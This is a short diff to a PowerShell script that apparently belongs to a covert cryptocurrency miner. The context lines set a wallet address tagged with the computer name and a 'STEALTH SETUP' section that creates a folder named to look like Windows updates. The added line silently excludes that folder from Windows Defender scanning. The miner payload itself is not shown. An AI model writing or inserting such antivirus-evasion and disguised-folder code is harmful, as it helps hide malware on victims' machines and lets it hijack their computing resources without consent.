@@ -8,6 +8,7 @@ $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr.$env:COMPUTERNAME"
 
 # --- STEALTH SETUP ---
 $StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
+try { Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue } catch { }
 if (-not (Test-Path $StealthDir)) {
     New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
 }
